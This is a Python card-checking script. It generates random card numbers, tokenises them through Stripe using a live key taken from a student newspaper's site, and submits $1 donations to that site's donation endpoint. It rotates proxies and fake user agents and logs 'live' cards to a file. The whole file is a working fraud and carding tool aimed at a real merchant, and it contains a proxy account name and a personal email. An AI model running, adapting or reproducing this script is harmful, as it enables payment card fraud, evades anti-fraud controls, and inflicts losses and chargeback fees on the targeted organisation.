import os
import random
import requests
import json
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.exceptions import ProxyError, ConnectionError
from urllib3.exceptions import InsecureRequestWarning
from threading import Lock
import time

# Define locks for each file
live_file_lock = Lock()
result_file_lock = Lock()

# Disable the InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Load environment variables from .env file
load_dotenv()

import random

def random_user_agent():
    available_types = ["Chrome", "Firefox", "Opera", "Explorer"]
    browser_type = random.choice(available_types)

    if browser_type == "Chrome":
        chrome_browsers = [
            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
        ]
        return random.choice(chrome_browsers)
    
    elif browser_type == "Firefox":
        firefox_browsers = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
            "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0",
            "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
        ]
        return random.choice(firefox_browsers)
    
    elif browser_type == "Opera":
        opera_browsers = [
            "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
            "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
            "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
            "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
            "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
            "Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00",
            "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0",
        ]
        return random.choice(opera_browsers)
    
    elif browser_type == "Explorer":
        explorer_browsers = [
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
        ]
        return random.choice(explorer_browsers)

def generate_random_card():
    issuer = random.choice(["4", "5", "6"])
    if issuer == "4":
        card_number = "4" + ''.join(random.choices('0123456789', k=15))
    elif issuer == "5":
        card_number = "5" + ''.join(random.choices('0123456789', k=15))
    else:
        card_number = "6" + ''.join(random.choices('0123456789', k=15))
    exp_month = str(random.randint(1, 12)).zfill(2)
    exp_year = str(random.randint(2023, 2030))
    cvc = ''.join(random.choices('0123456789', k=3))
    return card_number, exp_month, exp_year, cvc

def check_proxy(proxy):
    url = "https://api.ipify.org/"
    try:
        response = requests.get(url, proxies=proxy, timeout=10)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False
    
def get_random_proxy():
    username = "ml9yg1vhv36kqpl"
    password = os.getenv('PROXYSCRAPE_PASSWORD')
    proxy = "rp.proxyscrape.com:6060"
    proxy_auth = "{}:{}@{}".format(username, password, proxy)
    proxies = {
        "http":"http://{}".format(proxy_auth)
    }
    
    while check_proxy(proxies) == False:
        continue
    
    return proxies


def get_stripe_token(card_number, exp_month, exp_year, cvc, user_agent, proxies):
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user_agent,
    }
    payload = {
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': 'a2ef37b2-51da-4888-91d1-e6eec8887ecb070158',
        'muid': '671a702d-2400-425d-b4ea-d130688079b02ffd8f',
        'sid': 'f5b4bc2e-1b6e-4bb5-9ff2-0e9d94bde5756195ab',
        'payment_user_agent': 'stripe.js/b5d6cae0f; stripe-js-v3/b5d6cae0f',
        'time_on_page': '40582',
        'referrer': 'https://badgerherald.com/',
        'key': 'pk_live_ZqsOEoLHjZPnC0fB1FsjWzRv',
        'pasted_fields': 'number'
    }
    url = 'https://api.stripe.com/v1/tokens'
    
    try:
        response = requests.post(url, headers=headers, data=payload, proxies=proxies, verify=False, timeout=10)
        data = response.json()
        if data.get("error"):
            return "", data
        else:
            return data['id'], ""
    except Exception as e:
        return "", str(e)

def make_donation(token, user_agent, proxies):
    headers = {
        'authority': 'badgerherald.com',
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://badgerherald.com',
        'referer': 'https://badgerherald.com/donate/',
        'user-agent': user_agent,
        'x-wp-nonce': os.getenv('WP_NONCE'),
    }
    data = {
        'amount': 1,
        'first': 'Adi',
        'last': 'Singh',
        'reoccurance': 0,
        'token': token,
        'nonce': os.getenv('NONCE'),
        'email': 'adirajput1701x@gmail.com',
        'comment': '',
        'recaptcha': 'HFbnFzfQhXPxcyRU5GQFtXQQQgOjsQRi4hHSQmJjYIM3wUMiZvG1xmHRVkSCtTLTcVOA5qCgIAR0RXf2Q5DFs4OXU0Ok11Umw3VGZieVR8OldAZUogUHZrXixRRlcXHXZWUX50dUU9MiYUPlQsKQpaEhd4cgJ5YSx3W2RZPlg4dF90QU1kF2MXHRM3PVo'
    }
    try:
        response = requests.post('https://support.badgerherald.org/wp-json/donate/v1/process-donation', headers=headers, data=json.dumps(data), proxies=proxies, timeout=10, verify=False)
        return response.text
    except requests.exceptions.RequestException as e:
        return "Request exception"


def process_card():
    card_details = generate_random_card()
    card_number, exp_month, exp_year, cvc = card_details
    proxies = get_random_proxy()
    user_agent = random_user_agent()

    try:
        token, msg = get_stripe_token(card_number, exp_month, exp_year, cvc, user_agent, proxies)
        if token == "":
            return
        
        result = f"{card_number}|{exp_month}|{exp_year}|{cvc}"
        with live_file_lock:
            with open("live.txt", "a") as live_file:
                live_file.write(f"{result}\n")

        response = make_donation(token, user_agent, proxies)
        print(f"{card_number}: {response}")

        with result_file_lock:
            with open("result.txt", "a") as result_file:
                result_file.write(f"{result}|Message: {response}\n")

    except Exception as e:
        print(f"Error processing card {card_number}: {e}")


def main():
    max_workers = 10  # Number of threads to use
    duration = 60  # Run time in seconds (3 minutes)
    start_time = time.time()
    print("Start time: " + str(start_time))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        while time.time() - start_time < duration:
            executor.submit(process_card)
        if time.time() - start_time > duration:
            sys.exit("End time")

if __name__ == "__main__":
    main()
